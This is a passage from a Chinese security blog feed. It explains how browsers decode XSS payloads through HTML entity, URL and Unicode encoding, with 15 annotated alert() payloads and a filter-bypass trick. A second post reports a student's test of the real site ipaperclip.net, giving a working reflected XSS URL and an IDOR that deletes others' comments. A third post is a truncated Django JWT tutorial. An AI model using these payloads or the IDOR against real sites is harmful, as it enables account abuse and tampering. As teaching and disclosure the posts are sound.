title="3.Unicode编码"></a>3.Unicode编码</h2><p>解码操作在Javascript解析器中</p><p>JS解析器支持对标识符进行Unicode编码。什么是标识符？简单的说，标识符包括了函数名、字符串常量。主要看编码的字符是构成哪个部分的字符，如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">Alert(&#39;xss&#39;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>对于该例来说，alert(属于函数名部分，是标识符)可进行部分或全部的Unicode编码，xss(属于字符串常量，是标识符)也可进行全部/部分Unicode编码。换句话说，经Unicode解码后的内容只能构成函数名和字符串。</p><h1 id="0x03-常见添加编码的XSS载荷讲解"><a href="#0x03-常见添加编码的XSS载荷讲解" class="headerlink" title="0x03 常见添加编码的XSS载荷讲解"></a>0x03 常见添加编码的XSS载荷讲解</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1. &lt;a href&#x3D;&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">2. &lt;a href&#x3D;&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;</span><br><span class="line"></span><br><span class="line">3. &lt;a href&#x3D;&quot;javascript%3aalert(3)&quot;&gt;&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">4. &lt;div&gt;&amp;#60;img src&#x3D;x onerror&#x3D;alert(4)&amp;#62;&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">5. &lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;&#x2F;script&amp;#62;&lt;&#x2F;textarea&gt;</span><br><span class="line"></span><br><span class="line">6. &lt;textarea&gt;&lt;script&gt;alert(6)&lt;&#x2F;script&gt;&lt;&#x2F;textarea&gt;</span><br><span class="line"></span><br><span class="line">7. &lt;button onclick&#x3D;&quot;confirm(&#39;7&#39;);&quot;&gt;Button&lt;&#x2F;button&gt;</span><br><span class="line"></span><br><span class="line">8. &lt;button onclick&#x3D;&quot;confirm(&#39;8\u0027);&quot;&gt;Button&lt;&#x2F;button&gt;</span><br><span class="line"></span><br><span class="line">9. &lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">10. &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">11. &lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">12. &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">13. &lt;script&gt;alert(&#39;13\u0027)&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">14. &lt;script&gt;alert(&#39;14\u000a&#39;)&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">15. &lt;a href&#x3D;&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>载荷1：</p><p>HTML解析器解析a标签，将属性href的内容：%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29<br>发送给URL编码器，URL编码器找到:的位置，但%6a%61%76%61%73%63%72%69%70%74协议不存在，故无法确定协议，默认为http协议。对整个内容进行url解码，得：javascript:alert(1)，最终的结果相当于<ahref="http://javascript:alert(1)"></a>，载荷无效</p><p>载荷2：</p><p>HTML解析器在解析a标签，发现属性href的值内存在字符编码，将其转码为：javascript:%61%6c%65%72%74%28%32%29，将结果发送给URL解析器，URL解析器寻找:出现的位置，判断其协议，并将:后边内容进行URL转码，得到：alert(2)，由于是javascript协议，URL解析器将内容发送给JS解析器。载荷有效</p><p>载荷3：</p><p>同载荷1，由于找不到:，URL转码器按照默认http协议进行。结果相当于<code>&lt;a href=&quot;http://javascript:alert(3)&quot;&gt;&lt;/a&gt;</code></p><p>载荷4：</p><p>div属于常见元素中的一个，字符实体可以被成功解码，不过此时得到的是字符串型的数据，无法构成标签。</p><p>即：<code>&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</code>中，&#61;所代表的<code>&lt;</code>转码后得到的值为字符串型，无法被HTML解析器解析成构成的标签起始位的<code>&lt;</code>。若是<code>&lt;div&gt;&lt;img src=x onerror=alert(4)&gt;&lt;/div&gt;</code>的话是可以被成功解析的。</p><p>载荷5：</p><p>Textarea属于RCDATA元素，无法执行js脚本，虽支持实体字符编码，但此时得到的值为字符串型，也不能被解析，但可正常显示。</p><p>载荷6：</p><p>Textarea属于RCDATA元素，无法执行js脚本。</p><p>载荷7：</p><p>经HTML解析器解析，属性onclick的值<code>confirm(&#39;7&amp;#39;);</code>被Unicode解码得：<code>confirm(&#39;7&#39;);</code><br>由于是事件型属性，HTML编码器直接发送<code>confirm(&#39;7&#39;);</code>给JS解析器，载荷有效。</p><p>载荷8：</p><p>经HTML解析器解析，属性onclick的值 <code>confirm(&#39;8\u0027);</code><br>由于是事件型属性，HTML编码器直接发送<code>confirm(&#39;8\u0027);</code>给JS解析器，虽JS解析器支持Unicode解码，但该字符不为标识符(函数名/字符串常量)，载荷无效。</p><p>载荷9：</p><p>script标签属于原始文本元素，不支持字符实体编码。载荷无效。</p><p>载荷10：</p><p>script标签属于原始文本元素，HTML解析器直接将内容发送给JS解析器，JS解析器支持Unicode编码，且此处<code>\u0061\u006c\u0065\u0072\u0074(10);</code>为<code>alert(10)</code>，属于函数名，满足标识符限制，故可解码得到<code>alert(10)</code>。载荷有效。</p><p>载荷11：</p><p><code>\u0028\u0031\u0031\u0029</code> 解码后不属于标识符，载荷无效。</p><p>载荷12：</p><p><code>\u0031\u0032</code> 解码后为整数型数字，不属于标识符，载荷无效。</p><p>载荷13：</p><p>同11</p><p>载荷14：</p><p><code>14\u000a</code> 解码后，属于字符串型，属于标识符，载荷有效。</p><p>载荷15:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;</span><br></pre></td></tr></table></figure><p>经HTML实体解码得：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)</span><br></pre></td></tr></table></figure><br>经URL解码得：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:\u0061\u006c\u0065\u0072\u0074(15)</span><br></pre></td></tr></table></figure><br>经Unicode解码得：<code>alert(15)</code>，载荷有效。</p><h1 id="0x04-编码之外"><a href="#0x04-编码之外" class="headerlink" title="0x04 编码之外"></a>0x04 编码之外</h1><p>我们知道HTML解析器，在解析时会去掉一些干扰字符，如换行符、回车键、跳格键t等，故我们可以使用这个特性来绕开部分Filter</p><p>例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe</span><br><span class="line">src</span><br><span class="line">&#x3D;</span><br><span class="line">&quot;</span><br><span class="line">j</span><br><span class="line">avas</span><br><span class="line">cript</span><br><span class="line">:</span><br><span class="line">aler</span><br><span class="line">t</span><br><span class="line">(</span><br><span class="line">1)</span><br><span class="line">&quot;</span><br><span class="line">&gt;</span><br><span class="line">&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure></p><h1 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料:"></a>0x05 参考资料:</h1><ul><li><a href="https://www.jianshu.com/p/c0dc4bbab8e8">https://www.jianshu.com/p/c0dc4bbab8e8</a></li><li><a href="https://blog.csdn.net/wh_xmy/article/details/79567070">https://blog.csdn.net/wh_xmy/article/details/79567070</a></li><li><a href="https://www.w3.org/html/ig/zh/wiki/HTML5/syntax">https://www.w3.org/html/ig/zh/wiki/HTML5/syntax</a></li><li><a href="https://www.freebuf.com/articles/web/100675.html">https://www.freebuf.com/articles/web/100675.html</a></li><li><a href="https://blog.csdn.net/dlmu2001/article/details/5998130">https://blog.csdn.net/dlmu2001/article/details/5998130</a></li><li><a href="https://blog.csdn.net/wh_xmy/article/details/79567070">https://blog.csdn.net/wh_xmy/article/details/79567070</a></li><li><a href="https://xz.aliyun.com/t/1556">https://xz.aliyun.com/t/1556</a></li><li><a href="https://security.yirendai.com/news/share/26">https://security.yirendai.com/news/share/26</a></li><li><a href="http://bobao.360.cn/learning/detail/292.html">http://bobao.360.cn/learning/detail/292.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> 浏览器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对回形针paperclip站点的安全测试</title>
      <link href="2019/%E5%AF%B9%E5%9B%9E%E5%BD%A2%E9%92%88paperclip%E7%AB%99%E7%82%B9%E7%9A%84%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
      <url>2019/%E5%AF%B9%E5%9B%9E%E5%BD%A2%E9%92%88paperclip%E7%AB%99%E7%82%B9%E7%9A%84%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>先简单的介绍一下自己，Yunen，重庆大学大二信安在读生，是回形针paperclip的粉丝，对网络安全方面感兴趣，这次看到了回形针弄了自己的科普网站，打算利用自己的知识，给予回形针一点点小帮助:)</p><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><h2 id="前台搜索框XSS"><a href="#前台搜索框XSS" class="headerlink" title="前台搜索框XSS"></a>前台搜索框XSS</h2><p>使用特殊单词<code>test123</code>，先查看页面的输出点：</p><a id="more"></a><p><img src="https://img.0x002.com/article/PaperClip/image-20200202204139586.png" alt="image-20200202204139586"></p><p>可以看到页面有5个输出点，先把每个输出点都看一下:</p><p><img src="https://img.0x002.com/article/PaperClip/image-20200202204231400.png" alt="image-20200202204231400"></p><p><img src="https://img.0x002.com/article/PaperClip/image-20200202204246712.png" alt="image-20200202204246712"><br><img src="https://img.0x002.com/article/PaperClip/image-20200202204306439.png" alt="image-20200202204306439"><br><img src="https://img.0x002.com/article/PaperClip/image-20200202204316585.png" alt="image-20200202204316585"></p><p>发现输出点全部被引号给包围了起来，我们尝试跳出引号的限制。</p><p>首先尝试<code>&quot;</code>双引号。发现全部的输出点都进行了转码的处理(其中form表单转成<code>utf-8</code>编码，其他均为html实体编码)</p><p>接着尝试<code>&#39;</code>单引号，发现在此处，单引号可以成功跳出限制。</p><p><img src="https://img.0x002.com/article/PaperClip/image-20200202204949253.png" alt="image-20200202204949253"></p><p>通过查看网页的源代码可知：此处对于href属性的限制使用的是单引号。</p><p><img src="https://img.0x002.com/article/PaperClip/image-20200202205029884.png" alt="image-20200202205029884"></p><p>接下来就可以很容易的构造利用的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ipaperclip.net&#x2F;doku.php?do&#x3D;search&amp;id&#x3D;start&amp;sf&#x3D;1&amp;q&#x3D;test1%27%3E%3Cimg%20src&#x3D;x%20onerror&#x3D;alert(1)%3E%3Cimg%3E%3Cp</span><br></pre></td></tr></table></figure><p><img src="https://img.0x002.com/article/PaperClip/image-20200202205301539.png" alt="image-20200202205301539"></p><h3 id="tip此处还有第二个利用点"><a href="#tip此处还有第二个利用点" class="headerlink" title="tip此处还有第二个利用点"></a>tip此处还有第二个利用点</h3><p><img src="https://img.0x002.com/article/PaperClip/image-20200202205413830.png" alt="image-20200202205413830"></p><p>通过查看网页源代码知道：此处甚至没有使用引号进行包围：</p><p><img src="https://img.0x002.com/article/PaperClip/image-20200202205554547.png" alt="image-20200202205554547"></p><p>不过此处可被利用的前提是：搜索的结果不为空。</p><p>因为只有这样，页面才会有跳转表单的代码。</p><p>估计只有等回形针做了关于web安全的科普才有可能得以利用得上。</p><p>PS：我在编辑指南之中疑似看到了可以插入html代码，不过我并没有进行测试。</p><h2 id="网站绝对路径泄露"><a href="#网站绝对路径泄露" class="headerlink" title="网站绝对路径泄露"></a>网站绝对路径泄露</h2><p><img src="https://img.0x002.com/article/PaperClip/image-20200202213150874.png" alt="image-20200202213150874"></p><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>1）疑似可控制只读页面上传文件(未进行尝试)：</p><p><img src="https://img.0x002.com/article/PaperClip/image-20200202213453241.png" alt="image-20200202213453241"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ipaperclip.net&#x2F;lib&#x2F;exe&#x2F;mediamanager.php?ns&#x3D;wiki::%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E7%BC%96%E8%BE%91%E4%B8%80%E4%B8%AA%E6%9D%A1%E7%9B%AE&amp;edid&#x3D;wiki__text</span><br></pre></td></tr></table></figure><p>2）越权删除他人评论</p><p>这里选择一条删除不影响的评论作为演示</p><p><img src="https://img.0x002.com/article/PaperClip/image-20200202222451681.png" alt="image-20200202222451681"></p><p>右键审查元素查看回复按钮的源代码，可获取其对应的<code>cid</code>。</p><p><img src="https://img.0x002.com/article/PaperClip/image-20200202222507433.png" alt="image-20200202222507433"></p><p>抓取删除自己评论的数据包，并将其替换发送。</p><p><img src="https://img.0x002.com/article/PaperClip/image-20200202222734992.png" alt="image-20200202222734992"></p><p>成功删除（注意发表时间）：</p><p><img src="https://img.0x002.com/article/PaperClip/image-20200202222753632.png" alt="image-20200202222753632"></p><h2 id="公开漏洞利用"><a href="#公开漏洞利用" class="headerlink" title="公开漏洞利用"></a>公开漏洞利用</h2><p>由于时间关系，这里只测试了一个比较新的公开漏洞。其他请自测:)</p><h3 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h3><p><img src="https://img.0x002.com/article/PaperClip/image-20200202220756814.png" alt="image-20200202220756814"></p><p><img src="https://img.0x002.com/article/PaperClip/image-20200202220827803.png" alt="image-20200202220827803"></p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>此次测试花费一个小时左右，由于网站的用户交互处并不多，且原站点程序相对比较成熟，故对于黑盒测试来说，可以进行测试的点其实并不是很多，再加上我个人能力有限，只找到了这些BUG。最后，祝回形针PaperClip越办越好。</p>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django基于JWT实现微信小程序的登录和鉴权</title>
      <link href="2019/Django%E5%9F%BA%E4%BA%8EJWT%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%99%BB%E5%BD%95%E5%92%8C%E9%89%B4%E6%9D%83/"/>
      <url>2019/Django%E5%9F%BA%E4%BA%8EJWT%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%99%BB%E5%BD%95%E5%92%8C%E9%89%B4%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT?"></a>什么是JWT?</h1><p>JWT，全称Json Web Token，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。  </p><h2 id="与Session的区别"><a href="#与Session的区别" class="headerlink" title="与Session的区别"></a>与Session的区别</h2><p>一、Session是在服务器端的，而JWT是在客户端的，这点很重要。<br>二、流程不同：<br><img src="https://img.0x002.com/article/DjangoJWTWeChat/0b0ebdf71d58e1d45019a72ed28c5497.png" alt="图源网络"></p><a id="more"></a><h2 id="JWT使用场景"><a href="#JWT使用场景" class="headerlink" title="JWT使用场景"></a>JWT使用场景</h2><ul><li>大量需要进行跨域的站点</li><li>服务器运算能力较差、存储空间较小</li></ul><h2 id="JWT的原理"><a href="#JWT的原理" class="headerlink" title="JWT的原理"></a>JWT的原理</h2><p>JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;姓名&quot;</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;角色&quot;</span>: <span class="string">&quot;管理员&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;到期时间&quot;</span>: <span class="string">&quot;2018年7月1日0点0分&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名（详见后文）。</p><p>服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。</p><h2 id="JWT数据的格式"><a href="#JWT数据的格式" class="headerlink" title="JWT数据的格式"></a>JWT数据的格式</h2><p>实际的 JWT 大概就像下面这样。</p><p><img src="https://img.0x002.com/article/DjangoJWTWeChat/jwtdata.png" alt=""></p><p>它是一个很长的字符串，中间用点（<code>.</code>）分隔成三个部分。注意，JWT 内部是没有换行的，这里只是为了便于展示，将它写成了几行。</p><p>JWT 的三个部分依次如下。</p><ul><li>Header（头部）</li><li>Payload（负载）</li><li>Signature（签名）</li></ul><p><img src="https://img.0x002.com/article/DjangoJWTWeChat/jwttoken.png" alt="">  </p><h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>Header 部分是一个 JSON 对象，描述 JWT 的元数据，通常是下面的样子。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，alg属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；typ属性表示这个令牌（token）的类型（type），JWT 令牌统一写为JWT。</p><p>最后，将上面的 JSON 对象使用 Base64URL 算法（详见后文）转成字符串。</p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。</p><ul><li>iss (issuer)：签发人</li><li>exp (expiration time)：过期时间</li><li>sub (subject)：主题</li><li>aud (audience)：受众</li><li>nbf (Not Before)：生效时间</li><li>iat (Issued At)：签发时间</li><li>jti (JWT ID)：编号</li></ul><p>除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;sub&quot;</span>: <span class="string">&quot;1234567890&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;John Doe&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;admin&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。</p><p>这个 JSON 对象也要使用 Base64URL 算法转成字符串。</p><h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>Signature 部分是对前两部分的签名，防止数据篡改。</p><p>首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（.）分隔，就可以返回给用户。</p><h3 id="Base64URL"><a href="#Base64URL" class="headerlink" title="Base64URL"></a>Base64URL</h3><p>前面提到，Header 和 Payload 串型化的算法是 Base64URL。这个算法跟 Base64 算法基本类似，但有一些小的不同。</p><p>JWT 作为一个令牌（token），有些场合可能会放到 URL（比如 <code>api.example.com/?token=xxx</code>）。Base64 有三个字符+、/和=，在 URL 里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_ 。这就是 Base64URL 算法。</p><h2 id="JWT的使用方式"><a href="#JWT的使用方式" class="headerlink" title="JWT的使用方式"></a>JWT的使用方式</h2><p>客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。</p><p>此后，客户端每次与服务器通信，都要带上这个 JWT。你可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求的头信息Authorization字段里面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure><br>另一种做法是，跨域的时候，JWT 就放在 POST 请求的数据体里面。</p><h2 id="JWT-的几个特点"><a href="#JWT-的几个特点" class="headerlink" title="JWT 的几个特点"></a>JWT 的几个特点</h2><p>（1）JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。</p><p>（2）JWT 不加密的情况下，不能将秘密数据写入 JWT。</p><p>（3）JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。</p><p>（4）JWT 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦 JWT 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。</p><p>（5）JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。</p><p>（6）为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。</p><h2 id="内容说明"><a href="#内容说明" class="headerlink" title="内容说明"></a>内容说明</h2><p>以上主要内容转载于<a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">廖雪峰的网络日志</a></p><h1 id="实例：使用Django完成微信小程序的JWT登录及鉴权"><a href="#实例：使用Django完成微信小程序的JWT登录及鉴权" class="headerlink" title="实例：使用Django完成微信小程序的JWT登录及鉴权"></a>实例：使用Django完成微信小程序的JWT登录及鉴权</h1><p>网上目前已经有了一些文章来说明了，可是我在查阅的时候发现大多讲得不是很清楚。</p><h2 id="基本了解"><a href="#基本了解" class="headerlink" title="基本了解"></a>基本了解</h2><p>通过之前的内容铺垫，相信读者对于JWT都有了一定的了解，总的来说，便是JWT是保存在用户端的Token机制。  </p><p>需要注意的是：JWT默认是无加密的，只是使用了一层Base64编码，所以我们不能将重要信息，如密码等放入header和payload字段中。  </p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>对于Django来说，这里我们使用djangorestframework-jwt库  </p><p>安装命令：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install djangorestframework-jwt</span><br></pre></td></tr></table></figure><br>注意djangorestframework-jwt库默认将settings里的<code>SECRET_KEY</code>当中jwt加密秘钥。</p><p>首先我们先去我们的project下的settings文件内设置jwt库的一些参数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在末尾添加上</span></span><br><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line"><span class="string">&#x27;DEFAULT_AUTHENTICATION_CLASSES&#x27;</span>: (</span><br><span class="line">        <span 